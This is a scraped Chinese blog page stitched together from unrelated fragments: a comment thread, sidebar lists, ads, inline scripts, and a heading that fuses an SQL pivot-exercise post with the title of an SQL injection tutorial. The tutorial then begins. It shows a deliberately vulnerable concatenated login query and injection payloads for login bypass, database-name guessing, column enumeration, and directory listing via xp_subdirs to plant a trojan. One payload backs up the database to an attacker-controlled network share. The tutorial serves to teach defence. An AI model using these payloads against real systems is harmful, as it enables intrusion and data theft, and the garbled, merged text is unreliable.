+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>666666</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>  </p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3561995">#208楼</a> 2016-11-22 11:01</td>
+      <td><a href="https://www.cnblogs.com/mingjia/">jianiu</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>mark</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>  </p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3790634">#209楼</a> 2017-09-20 11:15</td>
+      <td><a href="https://www.cnblogs.com/sanfor/">浮生若梦丶丨</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>6666</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>https://pic.cnblogs.com/face/896034/20170905135439.png   </p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3803494">#210楼</a> 2017-10-06 15:32</td>
+      <td><a href="https://home.cnblogs.com/u/1252222/">成长记实录</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>点错了 抱歉 手贱我</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>  </p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3803495">#211楼</a> 2017-10-06 15:32</td>
+      <td><a href="https://home.cnblogs.com/u/1252222/">成长记实录</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>mark</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>  </p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3905324">#212楼</a> 3905324 2018/2/7 上午10:55:59 2018-02-07 10:55</td>
+      <td><a href="https://www.cnblogs.com/dahuo/">暗夜苹果</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>mark</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>  </p>
+
+<p><a href="#!comments">&lt; Prev</a> <a href="#!comments">1</a> <a href="#!comments">2</a> <a href="#!comments">3</a> <a href="#!comments">4</a> 5</p>
+
+<p>var commentManager = new blogCommentManager(); commentManager.renderComments(0);</p>
+
+<p><a href="javascript:void(0);">刷新评论</a><a href="#">刷新页面</a><a href="#top">返回顶部</a></p>
+
+<p>注册用户登录后才能发表评论，请 <a href="javascript:void(0);">登录</a> 或 <a href="javascript:void(0);">注册</a>， <a href="https://www.cnblogs.com/">访问</a> 网站首页。</p>
+
+<p><a href="http://www.ucancode.com/index.htm">【推荐】超50万行VC++源码: 大型组态工控、电力仿真CAD与GIS源码库</a><br />
+<a href="https://www.jdcloud.com/cn/activity/newUser?utm_source=DMT_cnblogs&amp;utm_medium=CH&amp;utm_campaign=09vm&amp;utm_term=Virtual-Machines">【活动】京东云限时优惠1.5折购云主机，最高返价值1000元礼品！</a><br />
+<a href="https://cloud.tencent.com/act/pro/overseas?fromSource=gwzcw.2802159.2802159.2802159&amp;utm_medium=cpc&amp;utm_id=gwzcw.2802159.2802159.2802159">【推荐】腾讯云海外云服务器1核2G19.8元/月</a><br />
+<a href="https://www.ctyun.cn/activity/#/20190919?hmsr=%E5%8D%9A%E5%AE%A2%E5%9B%AD-0916-919%E6%B4%BB%E5%8A%A8&amp;hmpl=&amp;hmcu=&amp;hmkw=&amp;hmci=">【推荐】919 天翼云钜惠，全网低价，云主机9元轻松购</a><br />
+<a href="http://clickc.admaster.com.cn/c/a131575,b3595121,c1705,i0,m101,8a1,8b3,h">【推荐】华为云文字识别资源包重磅上市，1元万次限时抢购</a><br />
+<a href="https://www.cnblogs.com/cmt/p/11505603.html">【福利】git pull &amp;&amp; cherry-pick 博客园&amp;华为云百万代金券</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>var googletag = googletag</td>
+      <td> </td>
+      <td>{}; googletag.cmd = googletag.cmd</td>
+      <td> </td>
+      <td>[]; googletag.cmd.push(function () { googletag.defineSlot(“/1090369/C1”, [300, 250], “div-gpt-ad-1546353474406-0”).addService(googletag.pubads()); googletag.defineSlot(“/1090369/C2”, [468, 60], “div-gpt-ad-1539008685004-0”).addService(googletag.pubads()); googletag.pubads().enableSingleRequest(); googletag.enableServices(); });</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>相关博文：</strong><br />
+· <a href="https://www.cnblogs.com/caoyan/archive/2012/12/01/SQL注入攻防入门详解.html" title="SQL注入攻防入门详解">SQL注入攻防入门详解</a><br />
+· <a href="https://www.cnblogs.com/jiangu66/p/3206821.html" title="SQL注入浅水攻防">SQL注入浅水攻防</a><br />
+· <a href="https://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html" title="SQL注入攻防入门详解">SQL注入攻防入门详解</a><br />
+· <a href="https://www.cnblogs.com/bily101/archive/2013/05/03/3055745.html" title="SQL注入攻防入门详解">SQL注入攻防入门详解</a><br />
+· <a href="https://www.cnblogs.com/chorrysky/archive/2013/02/22/2922034.html" title="SQL注入攻防入门详解">SQL注入攻防入门详解</a></p>
+
+<p><strong>最新 IT 新闻</strong>:<br />
+· <a href="//news.cnblogs.com/n/641596/">掉入黑洞会怎样？被拉成“面条”，还是前往另一个宇宙？</a><br />
+· <a href="//news.cnblogs.com/n/641595/">“走出非洲”的观点已经过时？</a><br />
+· <a href="//news.cnblogs.com/n/641594/">卓易科技和优刻得科创板过会</a><br />
+· <a href="//news.cnblogs.com/n/641593/">牛津博士大胆设想：平流层中借西风，氢气飞艇零耗能</a><br />
+· <a href="//news.cnblogs.com/n/641592/">阿里和谷歌自研AI芯片商用，科技巨头与芯片巨头关系生变</a><br />
+» <a href="https://news.cnblogs.com/" title="IT 新闻">更多新闻…</a></p>
+
+<p>fixPostBody(); setTimeout(function () { incrementViewCount(cb_entryId); }, 50); deliverAdT2(); deliverAdC1(); deliverAdC2(); loadNewsAndKb(); loadBlogSignature(); LoadPostCategoriesTags(cb_blogId, cb_entryId); LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid); GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType); loadOptUnderPost(); GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);</p>
+
+<p>loadBlogNews();</p>
+
+<p>loadBlogDefaultCalendar();</p>
+
+<h3 id="积分与排名">积分与排名</h3>
+
+<ul>
+  <li>积分 - 218934</li>
+  <li>排名 - 1762</li>
+</ul>
+
+<h3 id="随笔分类">随笔分类</h3>
+
+<ul>
+  <li><a href="https://www.cnblogs.com/heyuquan/category/1378387.html">DevOps(4)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/category/368748.html">dotnet(50)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/category/368749.html">安全设计(4)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/category/480073.html">大前端(6)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/category/1528801.html">工具(8)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/category/1378386.html">架构设计(6)</a></li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>[商业模式</td>
+          <td>商业分析(1)](https://www.cnblogs.com/heyuquan/category/576644.html)</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li><a href="https://www.cnblogs.com/heyuquan/category/595135.html">数据结构与算法(3)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/category/1378402.html">数据库(1)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/category/1528802.html">异步编程(20)</a></li>
+</ul>
+
+<h3 id="最新评论">最新评论</h3>
+
+<ul>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/dotnet-advance-learning-resource.html#4352998">1. Re:.NET Core 学习资料精选：进阶</a></li>
+  <li>良心博主</li>
+  <li>–ice_man1987</li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/dotnet-advance-learning-resource.html#4351038">2. Re:.NET Core 学习资料精选：进阶</a></li>
+  <li>整理的很齐全，质量很好。</li>
+  <li>–sunyuliang</li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/dotnet-advance-learning-resource.html#4350491">3. Re:.NET Core 学习资料精选：进阶</a></li>
+  <li>@ 权@oneDDN@何慕@【可乐不加冰】谢谢支持。…</li>
+  <li>–滴答的雨</li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/dotnet-advance-learning-resource.html#4350489">4. Re:.NET Core 学习资料精选：进阶</a></li>
+  <li>必须要点个赞!</li>
+  <li>–权</li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/dotnet-advance-learning-resource.html#4349408">5. Re:.NET Core 学习资料精选：进阶</a></li>
+  <li>很全面的资源整理，非常感谢楼主</li>
+  <li>–oneDDN</li>
+</ul>
+
+<h3 id="阅读排行榜">阅读排行榜</h3>
+
+<ul>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/form-plug-async-submit.html">1. 使用jQuery.form插件，实现完美的表单异步提交(178850)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html">2. SQL注入攻防入门详解(140693)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/archive/2013/05/13/js-jquery-ajax.html">3. 触碰jQuery：AJAX异步详解(99573)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/global-guid-identity-maxId.html">4. 如何在高并发分布式系统中生成全局唯一Id(77380)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/Linq-to-Objects.html">5. Linq之旅：Linq入门详解（Linq to Objects）(73199)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/archive/2012/07/26/2610959.html">6. 你必须懂的 T4 模板：深入浅出(49523)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/archive/2012/09/28/2707632.html">7. 博客美化：通用代码高亮插件（SyntaxHighlighter）(44940)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/net-batch-mail-send-async.html">8. .NET开发邮件发送功能的全面教程(含邮件组件源码)(41901)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/archive/2012/12/23/threadPool-manager.html">9. 异步编程：使用线程池管理线程(21692)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/bubble-quick-sort.html">10. 面试必知的冒泡排序和快速排序(21460)</a></li>
+</ul>
+
+<h3 id="推荐排行榜">推荐排行榜</h3>
+
+<ul>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/net-batch-mail-send-async.html">1. .NET开发邮件发送功能的全面教程(含邮件组件源码)(321)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html">2. SQL注入攻防入门详解(257)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/global-guid-identity-maxId.html">3. 如何在高并发分布式系统中生成全局唯一Id(234)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/archive/2013/05/13/js-jquery-ajax.html">4. 触碰jQuery：AJAX异步详解(216)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/Linq-to-Objects.html">5. Linq之旅：Linq入门详解（Linq to Objects）(204)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/dotnet-advance-learning-resource.html">6. .NET Core 学习资料精选：进阶(163)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/dotnet-basic-learning-resource.html">7. .NET Core 学习资料精选：入门(162)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/archive/2012/12/16/thread-base-and-use.html">8. 异步编程：线程概述及使用(161)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/e-business-summary-share.html">9. 电子商务知识精华，开发不再只懂代码(159)</a></li>
+  <li><a href="https://www.cnblogs.com/heyuquan/p/webForms-vs-mvc.html">10. [译]ASP.NET：WebForms vs MVC(137)</a></li>
+</ul>
+
+<p>loadBlogSideColumn();</p>
+
+<p>Powered by: <a href="http://www.cnblogs.com">博客园</a> 模板提供：<a href="http://blog.hjenglish.com">沪江博客</a> Copyright © 2019 滴答的雨<br />
+Powered by .NET Core 3.0.0-preview9-19423-09 on Linux</p>
+
+<p>$(function () { $(‘.toolbar .help’).attr(‘title’, ‘?’); }); $(“#PSignature”).ready(function(){ $(‘#tuijian’).click(function(){ eval(“”); }); }); $(“#mystats”).append($(“#myStatistics”)); var hadLoadDig = false; <!--关注、评论快速入口、返回顶部--> $(‘#blog-comments-placeholder’).ready(function() { var commentTime = setInterval(function(){ diggExtension(); if(hadLoadDig){ had_focused(); clearTimeout(commentTime); } },200); } ); function focusFunction(){ document.getElementById(“tbCommentBody”).focus(); } function had_focused() { var text = $(‘#p_b_follow’).text(); if(text==’已关注 -取消’){ $(‘#guanzhu’).text(‘已关注【滴答的雨】’); } } function after_guanzhu(){ var commentTime = setInterval(function(){ var text = $(‘#p_b_follow’).text(); if(text==’关注成功’){ $(‘#guanzhu’).text(‘已关注【滴答的雨】’); clearTimeout(commentTime); } },50); } function diggExtension(){ /<em>在div_digg中添加关注链接</em>/ var div_digg = document.getElementById(“div_digg”); if(div_digg ){ var my_div = document.createElement(“div”); my_div.style.padding=”0 0 5px 0”; my_div.innerHTML = “&lt;a id=’guanzhu’ onclick=\“follow(‘7c8a509c-abf3-de11-ba8f-001cf0cd104b’);after_guanzhu()\” href=\“javascript:void(0);\” style=\“font-weight: bold; padding-left: 5px;text-decoration :underline; \“&gt;关注 【滴答的雨】&lt;/a&gt;” div_digg.insertBefore(my_div,div_digg.firstChild); /<em>添加关注链接结束</em>/ /<em>添加评论快速入口</em>/ $(‘#div_digg’).append(“&lt;div&gt;&lt;a onclick=\“javascript:focusFunction();\” href=\“javascript:void(0);\” style=\“font-weight: bold; \“&gt;快速评论&lt;/a&gt;     &lt;a href=\“#top\” style=\“font-weight: bold; \“&gt;返回顶部&lt;/a&gt;&lt;/div&gt;”); hadLoadDig=true; } } <!--评论，生成气泡效果标签代码--> $(‘#blog-comments-placeholder’).ready( function() { var commentTime = setInterval( function(){ if($(“.feedbackItem”).length&gt;0) { CommentBubble(); clearTimeout(commentTime); } },50); } ); function CommentBubble() { var w1 = ‘&lt;div class="list"&gt;’ + ‘&lt;table class="out" border="0" cellspacing="0" cellpadding="0"&gt; ‘ + ‘&lt;tr&gt;’ + ‘&lt;td class="icontd" align="right" valign="bottom"&gt;’ + ‘<img src="https://www.cnblogs.com/images/cnblogs\_com/heyuquan/406488/t\_op.png" width="70px" height="57px" />’ + ‘&lt;/td&gt;’ + ‘&lt;td align="left" valign="bottom" class="q"&gt;’ + ‘&lt;table border="0" cellpadding="0" cellspacing="0" style=""&gt; ‘ + ‘&lt;tr&gt;&lt;td class="topleft"&gt;&lt;/td&gt;&lt;td class="top"&gt;&lt;/td&gt;&lt;td class="topright"&gt;&lt;/td&gt;&lt;/tr&gt; ‘ + ‘&lt;tr&gt;&lt;td class="left"&gt;&lt;/td&gt; &lt;td align="left" class="conmts"&gt;&lt;p&gt;’; var w2 = ‘&lt;/p&gt; &lt;/td&gt; &lt;td class="right"&gt;&lt;/td&gt;&lt;/tr&gt; ‘ + ‘&lt;tr&gt;&lt;td class="bottomleft"&gt;&lt;/td&gt;&lt;td class="bottom"&gt;&lt;/td&gt;&lt;td class="bottomright"&gt;&lt;/td&gt;&lt;/tr&gt; ‘ + ‘&lt;/table&gt;’ + ‘&lt;/td&gt; ‘ + ‘&lt;/tr&gt; ‘ + ‘&lt;/table&gt; ‘ + ‘&lt;/div&gt;’; $.each($(“.blog_comment_body”), function(i, t) { $(t).html(w1 + $(t).html() + w2); }); $(“.louzhu”).parent().find(‘.out’) .removeClass(“out”).addClass(“inc”); /<em>.find(“.q”).attr(“align”,”right”);</em>/ }## 目标</p>
+
+<h1 id="去除-iconfinder-上-icon-的水印-select-_-from-后有多个表的使用方法转-2012-03-27-135534-转载--标签-杂谈-分类-oraclesql-第一题1-已知一个表的结构为---姓名-科目-成绩-张三-语文-20-张三-数学-30-张三-英语-50-李四-语文-70-李四-数学-60-李四-英语-90-怎样通过-select-语句把他变成以下结构--姓名-语文成绩-数学成绩-英语成绩-张三-20-30-50-李四-70-60-90-insert-into-student-values李四英语90-select-_-from-student--法一-正解如下-select-a姓名a成绩-as-语文成绩b成绩-as-数学成绩c成绩-as-英语成绩-from-student-astudent-bstudent-c-where-a姓名b姓名-and-b姓名c姓名-and-a科目语文-and-b科目数学-and-c科目英语-理解如下-select-_-from-student-astudent-bstudent-c-将三个相同的-student-表相互连接连接生成-666216-条记录因为每个表中有-6-条记录-where-a姓名b姓名-and-b姓名c姓名-对连接表记录进行筛选得到333333272754-条记录-and-a科目语文-and-b科目数学-and-c科目英语-同时筛选三个子表中的科目内容执行可得如下-姓名-科目-成绩-姓名-科目-成绩-姓名-科目-成绩-张三-语文-20-张三-数学-30-张三-英语-50-李四-语文-70-李四-数学-60-李四-英语-90-再在-select-中定义一下输出即可--法二正解如下-select-姓名-sumcase-科目-when-语文-then-成绩-else-0-end-as-语文成绩-sumcase-科目-when-数学-then-成绩-else-0-end-as-数学成绩-sumcase-科目-when-英语-then-成绩-else-0-end-as-英语成绩-avg成绩-as-平均成绩sum成绩-as-总成绩-from-student-group-by-姓名-order-by-姓名-desc-结果如下-姓名-语文成绩-数学成绩-英语成绩-平均成绩-总成绩-张三-20-30-50-33-100-李四-70-60-90-73-220-2-create-table-a--year-int-quarter-varchar30-amount-float--insert-a-select-2000111-insert-a-select-2000212-insert-a-select-2000313-insert-a-select-2000414-insert-a-select-2001121-insert-a-select-2001222-insert-a-select-2001323-insert-a-select-2001424-表-a-定义如下-属性类型-year-integer-quarter-varchar30-amount-float-year-quarter-amount-2000-1-11-2000-2-12-2000-3-13-2000-4-14-2001-1-21-2001-2-22-2001-3-23-2001-4-24-其中每行表表示一个季度的数据-如果处理表-a-中的数据得到如下的结果-year-quarter1-quarter2-quarter3-quarter4-2000-11-12-13-14-2001-21-22-23-24-请用-sql-写一段代码实现-法一正解如下-select-t1yeart1amount-as-quarter1t2amount-as-quarter2t3amount-as-quarter3t4amount-as-quarter4-from-a-t1a-t2a-t3a-t4-where-t1yeart2year-and-t2yeart3year-and-t3yeart4year-and-t1quarter1-and-t2quarter2-and-t3quarter3-and-t4quarter4-法二正解如下-select-year-sumcase-quarter-when-1-then-amount-else-0-end-as-quarter1-sumcase-quarter-when-2-then-amount-else-0-end-as-quarter2-sumcase-quarter-when-3-then-amount-else-0-end-as-quarter3-sumcase-quarter-when-4-then-amount-else-0-end-as-quarter4-sumamount-as-allamount-from-a-group-by-year-order-by-year-第二题-有一张老师表-tt_idt_name-有一张学生表-ss_ids_name-有一张班级表-ct_ids_idc_name-其中-c_name-的取值只有大班和小班-请查询出符合条件的老师的名字条件是老师在大班中带的学生数大于此老师在小班中带的学生数-最好用子查询吧题目是这么要求的另数据库用的是-sql-server-select-_-from-t-select-count-as-xt_id-from-c-where-c_name小班-group-by-t_id-a-select-count-as-xt_id-from-c-where-c_name大班-group-by-t_id-b-where-bx-ax-and-at_idbt_id-and-tt_idbt_id-第三题-某个公司的面试题题目如下-1找出哪些工资高于他们所在部门的平均工资的员工--select-a_-from-工资表-a-joinselect-部门代码avg工资as-平均工资-from-工资表-group-by-部门代码b-on-a部门代码-b部门代码-where-a工资b平均工资-2找出哪些工资高于他们所在部门的-manager经理的工资的员工--select-a_-from-工资表-a-join-select--from-工资表-where-职务经理b-on-a部门代码-b部门代码-where-a工资b工资sql-注入攻防入门详解">去除 iconfinder 上 icon 的水印 select _ from 后有多个表的使用方法[转] (2012-03-27 13:55:34) 转载 ▼ 标签： 杂谈 分类： Oracle/SQL 第一题：(1) 已知一个表的结构为： ——————- 姓名 科目 成绩 张三 语文 20 张三 数学 30 张三 英语 50 李四 语文 70 李四 数学 60 李四 英语 90 怎样通过 select 语句把他变成以下结构： ———————————— 姓名 语文成绩 数学成绩 英语成绩 张三 20 30 50 李四 70 60 90 insert into student values(‘李四’,’英语’,’90’) select _ from student —-法一: 正解如下： select A.姓名,A.成绩 as 语文成绩,B.成绩 as 数学成绩,C.成绩 as 英语成绩 from student A,student B,student C where A.姓名=B.姓名 and B.姓名=C.姓名 and A.科目=’语文’ and B.科目=’数学’ and C.科目=’英语’ ——–理解如下： select _ from student A,student B,student C –将三个相同的 student 表相互连接，连接生成 6*6*6=216 条记录,因为每个表中有 6 条记录。 where A.姓名=B.姓名 and B.姓名=C.姓名 –对连接表记录进行筛选；得到(3*3*3)+(3*3*3)=27+27=54 条记录。 and A.科目=’语文’ and B.科目=’数学’ and C.科目=’英语’ –同时筛选三个子表中的科目内容,执行可得如下。 姓名 科目 成绩 姓名 科目 成绩 姓名 科目 成绩 张三 语文 20 张三 数学 30 张三 英语 50 李四 语文 70 李四 数学 60 李四 英语 90 再在 select 中定义一下输出即可。 —-法二：正解如下 select 姓名, sum(case 科目 when ‘语文’ then 成绩 else 0 end) as 语文成绩, sum(case 科目 when ‘数学’ then 成绩 else 0 end) as 数学成绩, sum(case 科目 when ‘英语’ then 成绩 else 0 end) as 英语成绩, avg(成绩) as 平均成绩,sum(成绩) as 总成绩 from student group by 姓名 order by 姓名 desc 结果如下: 姓名 语文成绩 数学成绩 英语成绩 平均成绩 总成绩 张三 20 30 50 33 100 李四 70 60 90 73 220 (2) create table A ( year int, Quarter varchar(30), amount float ) insert A select 2000,’1’,1.1 insert A select 2000,’2’,1.2 insert A select 2000,’3’,1.3 insert A select 2000,’4’,1.4 insert A select 2001,’1’,2.1 insert A select 2001,’2’,2.2 insert A select 2001,’3’,2.3 insert A select 2001,’4’,2.4 表 A 定义如下： 属性类型 Year Integer Quarter Varchar（30） Amount float Year Quarter Amount 2000 1 1.1 2000 2 1.2 2000 3 1.3 2000 4 1.4 2001 1 2.1 2001 2 2.2 2001 3 2.3 2001 4 2.4 其中每行表表示一个季度的数据。 如果处理表 A 中的数据，得到如下的结果。 Year Quarter1 Quarter2 Quarter3 Quarter4 2000 1.1 1.2 1.3 1.4 2001 2.1 2.2 2.3 2.4 请用 SQL 写一段代码实现。 —法一:正解如下： select T1.YEAR,T1.amount as Quarter1,T2.amount as Quarter2,T3.amount as Quarter3,T4.amount as Quarter4 from A T1,A T2,A T3,A T4 WHERE T1.YEAR=T2.YEAR AND T2.YEAR=T3.YEAR AND T3.YEAR=T4.YEAR AND T1.Quarter=’1’ and T2.Quarter=’2’ and T3.Quarter=’3’ and T4.Quarter=’4’ —法二:正解如下： select year, sum(case Quarter when ‘1’ then Amount else 0 end) as Quarter1, sum(case Quarter when ‘2’ then Amount else 0 end) as Quarter2, sum(case Quarter when ‘3’ then Amount else 0 end) as Quarter3, sum(case Quarter when ‘4’ then Amount else 0 end) as Quarter4, sum(Amount) as ALLAmount from A group by year order by year 第二题： 有一张老师表 T(T_ID,T_NAME)； 有一张学生表 S(S_ID,S_NAME)； 有一张班级表 C(T_ID,S_ID,C_NAME)， 其中 C_NAME 的取值只有‘大班’和‘小班’， 请查询出符合条件的老师的名字，条件是老师在大班中带的学生数大于此老师在小班中带的学生数。 （最好用子查询吧，题目是这么要求的，另数据库用的是 SQL Server） select _ from T, (select count(<em>) as x,T_ID from C where c_name=’小班’ group by T_ID) a, (select count(</em>) as x,T_ID from C where c_name=’大班’ group by T_ID) b where b.x &gt;a.x and a.T_ID=b.T_ID and T.T_ID=b.T_ID 第三题 某个公司的面试题，题目如下： 1、找出哪些工资高于他们所在部门的平均工资的员工； ————————————————– select A._ from 工资表 a join（select 部门代码，AVG（工资）as 平均工资 from 工资表 group by 部门代码）B on a.部门代码＝ B.部门代码 where a.工资&gt;B.平均工资 2、找出哪些工资高于他们所在部门的 manager(经理）的工资的员工; ————————————————————– select A._ from 工资表 a join （select * from 工资表 where 职务＝经理）B on a.部门代码＝ B.部门代码 where a.工资&gt;B.工资<a href="https://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html">SQL 注入攻防入门详解</a></h1>
+
+<p>毕业开始从事 winform 到今年转到 web ，在码农届已经足足混了快接近 3 年了，但是对安全方面的知识依旧薄弱，事实上是没机会接触相关开发……必须的各种借口。这几天把 sql 注入的相关知识整理了下，希望大家多多提意见。</p>
+
+<p>（对于 sql 注入的攻防，我只用过简单拼接字符串的注入及参数化查询，可以说没什么好经验，为避免后知后觉的犯下大错，专门查看大量前辈们的心得，这方面的资料颇多，将其精简出自己觉得重要的，就成了该文）</p>
+
+<p>下面的程序方案是采用 ASP.NET + MSSQL，其他技术在设置上会有少许不同。</p>
+
+<p><a href="http://files.cnblogs.com/heyuquan/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E9%98%B2%E5%85%A5%E9%97%A8%E8%AF%A6%E8%A7%A3_%E7%A4%BA%E4%BE%8B.rar">示例程序下载：SQL 注入攻防入门详解_示例</a></p>
+
+<p>什么是 SQL 注入（SQL Injection）</p>
+
+<p>所谓 SQL 注入式攻击，就是攻击者把 SQL 命令插入到 Web 表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的 SQL 命令。在某些表单中，用户输入的内容直接用来构造（或者影响）动态 SQL 命令，或作为存储过程的输入参数，这类表单特别容易受到 SQL 注入式攻击。</p>
+
+<p>尝尝 SQL 注入</p>
+
+<ol>
+  <li>一个简单的登录页面</li>
+</ol>
+
+<p>关键代码：（详细见下载的示例代码）</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p><code class="highlighter-rouge">private</code> <code class="highlighter-rouge">bool</code> ` NoProtectLogin(``string ` <code class="highlighter-rouge">userName,</code> <code class="highlighter-rouge">string</code> <code class="highlighter-rouge">password)</code></p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge">int</code> ` count = (<code class="highlighter-rouge">int</code>)SqlHelper.Instance.ExecuteScalar(<code class="highlighter-rouge">string</code>.Format `</p>
+
+<p><code class="highlighter-rouge"> (</code><code class="highlighter-rouge">"SELECT COUNT(*) FROM Login WHERE UserName='{0}' AND Password='{1}'"</code><code class="highlighter-rouge">, userName, password)); </code></p>
+
+<p><code class="highlighter-rouge">return</code> <code class="highlighter-rouge">count &gt; 0 ?</code> <code class="highlighter-rouge">true</code> <code class="highlighter-rouge">:</code> ` false``; `</p>
+
+<p><code class="highlighter-rouge">}</code></p>
+
+<p>方法中 userName 和 password 是没有经过任何处理，直接拿前端传入的数据，这样拼接的 SQL 会存在注入漏洞。（帐户：admin 123456）</p>
+
+<ol>
+  <li>输入正常数据，效果如图：</li>
+</ol>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311921598057.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922046482.png" alt="image" title="image" /></a></p>
+
+<p>合并的 SQL 为：</p>
+
+<p>SELECT COUNT(*) FROM Login WHERE UserName=’admin’ AND Password=’123456’</p>
+
+<ol>
+  <li>输入注入数据：</li>
+</ol>
+
+<p>如图，即用户名为：用户名：admin’—，密码可随便输入</p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/20121031192207853.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922089084.png" alt="image" title="image" /></a></p>
+
+<p>合并的 SQL 为：</p>
+
+<p>SELECT COUNT(*) FROM Login WHERE UserName=’admin’– Password=’123’</p>
+
+<p>因为 UserName 值中输入了“–”注释符，后面语句被省略而登录成功。（常常的手法：前面加上’; ‘ (分号，用于结束前一条语句)，后边加上’–’ (用于注释后边的语句)）</p>
+
+<ol>
+  <li>上面是最简单的一种 SQL 注入，常见的注入语句还有：</li>
+</ol>
+
+<p>1) 猜测数据库名，备份数据库</p>
+
+<p>a) 猜测数据库名： and db_name() &gt;0 或系统表 master.dbo.sysdatabases</p>
+
+<p>b) 备份数据库：;backup database 数据库名 to disk = ‘c:\*.db’;–</p>
+
+<p>或：declare @a sysname;set @a=db_name();backup database @a to disk=’你的 IP 你的共享目录 bak.dat’ ,name=’test’;–</p>
+
+<ol>
+  <li>猜解字段名称</li>
+</ol>
+
+<p>a) 猜解法：and (select count(字段名) from 表名)&gt;0 若“字段名”存在，则返回正常</p>
+
+<p>b) 读取法：and (select top 1 col_name(object_id(‘表名’),1) from sysobjects)&gt;0 把 col_name(object_id(‘表名’),1)中的 1 依次换成 2,3,4,5，6…就可得到所有的字段名称。</p>
+
+<ol>
+  <li>遍历系统的目录结构，分析结构并发现 WEB 虚拟目录（服务器上传木马）</li>
+</ol>
+
+<p>先创建一个临时表：;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));–</p>
+
+<p>a) 利用 xp_availablemedia 来获得当前所有驱动器,并存入 temp 表中</p>
+
+<p>;insert temp exec master.dbo.xp_availablemedia;–</p>
+
+<p>b) 利用 xp_subdirs 获得子目录列表,并存入 temp 表中</p>
+
